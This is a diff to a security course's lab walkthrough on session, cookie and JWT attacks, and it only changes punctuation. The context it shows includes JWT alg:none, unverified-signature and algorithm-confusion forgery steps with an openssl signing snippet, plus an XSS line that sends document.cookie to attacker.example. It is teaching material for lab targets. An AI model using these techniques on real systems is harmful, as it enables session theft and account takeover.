@@ -1,4 +1,4 @@
-# Week 02: Attack walkthrough — Sessions, Cookies, and JWTs
+# Week 02: Attack walkthrough - Sessions, Cookies, and JWTs
 
 > ⚠️ **Lab only.** Targets are PortSwigger Academy + Juice Shop on your machine.
 
@@ -26,8 +26,8 @@ Three base64url-encoded parts separated by `.`:
 
 | Part | Decoded |
 |---|---|
-| `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` | `{"alg":"HS256","typ":"JWT"}` — header |
-| `eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9` | `{"sub":"123","role":"user"}` — claims |
+| `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` | `{"alg":"HS256","typ":"JWT"}` - header |
+| `eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9` | `{"sub":"123","role":"user"}` - claims |
 | `dGhpcy...` | HMAC-SHA256 signature over `header.payload` |
 
 The first two parts are **plaintext**. Anyone holding the JWT can read the claims. The signature stops *modification*, not *reading*.
@@ -36,7 +36,7 @@ The first two parts are **plaintext**. Anyone holding the JWT can read the claim
 
 ## Part 2: JWT attacks
 
-### Attack 1: `alg: none` — strip the signature entirely
+### Attack 1: `alg: none` - strip the signature entirely
 
 The JWT spec includes a value `none` for the `alg` field, meaning "unsigned." A buggy verifier accepts this:
 
@@ -55,7 +55,7 @@ In Burp:
 
 A vulnerable server reads `alg: none`, doesn't validate, accepts the claim. You're now admin.
 
-Most modern JWT libraries reject `alg: none` *only if you pass an explicit `algorithms=` allow-list to `verify()`*. Many libraries' defaults — including `node-jsonwebtoken` <v9 — silently accepted `alg: none` in the recent past. The PortSwigger "Unverified signature" lab demonstrates this against real-world configurations. **Always pass `algorithms=['RS256']` (or whatever you actually expect) — don't rely on the default.**
+Most modern JWT libraries reject `alg: none` *only if you pass an explicit `algorithms=` allow-list to `verify()`*. Many libraries' defaults - including `node-jsonwebtoken` <v9 - silently accepted `alg: none` in the recent past. The PortSwigger "Unverified signature" lab demonstrates this against real-world configurations. **Always pass `algorithms=['RS256']` (or whatever you actually expect) - don't rely on the default.**
 
 ### Attack 2: Flawed verification (no signature check)
 
@@ -63,14 +63,14 @@ Some implementations *parse* the JWT but never call the verify function. The res
 
 1. Take a valid JWT.
 2. Modify a claim.
-3. **Leave the signature unchanged** — don't recompute it.
+3. **Leave the signature unchanged** - don't recompute it.
 4. Send.
 
 If the response accepts you with the modified claim, the server is parsing without verifying. PortSwigger's "JWT authentication bypass via unverified signature" lab.
 
 ### Attack 3: Algorithm confusion (RS256 → HS256)
 
-The dangerous one. The server expects asymmetric (`RS256`) — verifying with the public key. An attacker switches to symmetric (`HS256`) and signs with the **public key as the HMAC secret**:
+The dangerous one. The server expects asymmetric (`RS256`) - verifying with the public key. An attacker switches to symmetric (`HS256`) and signs with the **public key as the HMAC secret**:
 
 ```mermaid
 ---
@@ -101,7 +101,7 @@ echo -n "$header.$payload" \
   | openssl base64 | tr '+/' '-_' | tr -d '='
 ```
 
-> 💬 **In practice you usually need to try several encodings of the public key** — the PEM as-is, the PEM with the trailing newline trimmed, just the base64 body without headers, the raw DER, and what `cryptography.hazmat.primitives.serialization.public_bytes()` produces. Different verifier implementations hand different byte sequences to the HMAC. Script all five for an engagement.
+> 💬 **In practice you usually need to try several encodings of the public key** - the PEM as-is, the PEM with the trailing newline trimmed, just the base64 body without headers, the raw DER, and what `cryptography.hazmat.primitives.serialization.public_bytes()` produces. Different verifier implementations hand different byte sequences to the HMAC. Script all five for an engagement.
 
 PortSwigger's "Algorithm confusion" lab walks through this in detail. **Read it; this attack still hits production code in 2026.**
 
@@ -185,14 +185,14 @@ We did the basics in Week 01. With sessions in scope this week, the chain is:
 fetch('https://attacker.example/?c=' + encodeURIComponent(document.cookie))
 ```
 
-This **only works if the cookie lacks `HttpOnly`**. The single most impactful hardening for session cookies is `HttpOnly` — it doesn't prevent XSS, but it forces the attacker to use the cookie via the victim's browser (CSRF-style) rather than exfiltrating it.
+This **only works if the cookie lacks `HttpOnly`**. The single most impactful hardening for session cookies is `HttpOnly` - it doesn't prevent XSS, but it forces the attacker to use the cookie via the victim's browser (CSRF-style) rather than exfiltrating it.
 
 ### Attack 10: "Remember me" tokens
 
 Long-lived "remember me" tokens are tempting attack surface:
 
 - Often stored less securely than session cookies (DB plaintext)
-- Long TTL — months
+- Long TTL - months
 - Often allow login *without* MFA
 - Sometimes recoverable from cookies on devices the user no longer owns
 
